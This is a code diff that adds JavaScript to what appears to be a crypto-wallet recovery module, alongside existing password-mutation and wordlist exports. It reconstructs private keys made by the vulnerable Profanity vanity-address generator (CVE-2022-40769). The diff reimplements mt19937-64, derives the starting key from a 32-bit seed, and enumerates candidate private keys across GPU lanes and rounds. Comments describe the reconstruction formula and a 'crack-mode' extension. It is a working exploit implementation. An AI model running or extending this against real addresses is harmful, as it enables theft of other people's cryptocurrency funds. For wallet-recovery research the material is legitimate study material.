@@ -1477,7 +1477,102 @@ function generatePasswordMutations(hints = [], maxCandidates = 25000) {
   return Array.from(seen);
 }
 
+/* ============================================================================
+ * PROFANITY VANITY-GENERATOR KEY FAMILY (CVE-2022-40769) — exact reconstruction
+ *
+ * Reverse-engineered from johguse/profanity source (Dispatcher.cpp createSeed /
+ * printResult + profanity.cl init/iterate kernels), cross-checked against
+ * Amber Group's "Exploiting the Profanity Flaw":
+ *
+ *   1. std::random_device() produced a 32-BIT seed (the entire weakness).
+ *   2. std::mt19937_64 eng(seed); std::uniform_int_distribution<uint64_t> d;
+ *      r.s[0..3] = 4 x d(eng)  — a full-range uint64 distribution is the raw
+ *      engine output on every major STL — first output = LEAST significant word:
+ *        d0 = s[0] | s[1]<<64 | s[2]<<128 | s[3]<<192
+ *   3. GPU lane w started at key  d0 + w*2^192  (kernel: seed.w + id in the TOP
+ *      word) and walked +1 per round; a vanity hit at round R prints
+ *      key = d0 + w*2^192 + R  (printResult: s[0]+=round, s[3]+=foundId).
+ *
+ * Reconstruction formula (Amber Group, 2022):  key = d0(seed) + (1<<192)*w + R.
+ * ========================================================================== */
+class Mt19937_64 {
+  constructor(seed) {
+    this.mt = new Array(312);
+    this.mti = 313;
+    this.seed(seed == null ? 5489n : BigInt(seed) & 0xFFFFFFFFFFFFFFFFn);
+  }
+
+  /** Standard mt19937-64 init (Matsumoto & Nishimura). */
+  seed(s) {
+    this.mt[0] = s & 0xFFFFFFFFFFFFFFFFn;
+    for (let i = 1; i < 312; i++) {
+      const prev = this.mt[i - 1];
+      this.mt[i] = (6364136223846793005n * (prev ^ (prev >> 62n)) + BigInt(i)) & 0xFFFFFFFFFFFFFFFFn;
+    }
+    this.mti = 312;
+  }
+
+  next() {
+    const NN = 312, MM = 156;
+    const MATRIX_A = 0xB5026F5AA96619E9n;
+    const UM = 0xFFFFFFFF80000000n;
+    const LM = 0x7FFFFFFFn;
+    const mag01 = [0n, MATRIX_A];
+    if (this.mti >= NN) {
+      let kk;
+      for (kk = 0; kk < NN - MM; kk++) {
+        const y = (this.mt[kk] & UM) | (this.mt[kk + 1] & LM);
+        this.mt[kk] = this.mt[kk + MM] ^ (y >> 1n) ^ mag01[Number(y & 1n)];
+      }
+      for (; kk < NN - 1; kk++) {
+        const y = (this.mt[kk] & UM) | (this.mt[kk + 1] & LM);
+        this.mt[kk] = this.mt[kk + (MM - NN)] ^ (y >> 1n) ^ mag01[Number(y & 1n)];
+      }
+      const y = (this.mt[NN - 1] & UM) | (this.mt[0] & LM);
+      this.mt[NN - 1] = this.mt[MM - 1] ^ (y >> 1n) ^ mag01[Number(y & 1n)];
+      this.mti = 0;
+    }
+    let y = this.mt[this.mti++];
+    y ^= (y >> 29n) & 0x5555555555555555n;
+    y ^= (y << 17n) & 0x71D67FFFEDA60000n;
+    y ^= (y << 37n) & 0xFFF7EEE000000000n;
+    y ^= y >> 43n;
+    return y & 0xFFFFFFFFFFFFFFFFn;
+  }
+}
+
+/** The 256-bit starting key d0 for a 32-bit Profanity seed (s[0] = first output = LSB). */
+function profanitySeedKey(seed32) {
+  const eng64 = new Mt19937_64(BigInt(seed32 >>> 0));
+  const s0 = eng64.next();
+  const s1 = eng64.next();
+  const s2 = eng64.next();
+  const s3 = eng64.next();
+  return s0 | (s1 << 64n) | (s2 << 128n) | (s3 << 192n);
+}
+
+/**
+ * Candidate private keys for one Profanity seed on the GPU grid
+ * key = d0 + w*2^192 + t.  Real users' printed keys live at t >= 2 (the init
+ * kernel jumps once before the first derived round), so lanes [0, lanes) x
+ * depth [0, depth) is a strict superset of the low-round user keys in those
+ * lanes.  Full grid coverage needs lanes up to 255*16384 and deep rounds —
+ * that is the crack-mode problem, not a sweep.
+ */
+function profanityKeys(seed32, lanes = 1, depth = 4) {
+  const d0 = profanitySeedKey(seed32);
+  const out = [];
+  for (let w = 0; w < lanes; w++) {
+    const base = d0 + (BigInt(w) << 192n);
+    for (let t = 0; t < depth; t++) out.push(base + BigInt(t));
+  }
+  return out;
+}
+
 module.exports = {
+  Mt19937_64,
+  profanitySeedKey,
+  profanityKeys,
   WORDLIST,
   WORD_TO_INDEX,
   MULTI_LANG_WORDLISTS,
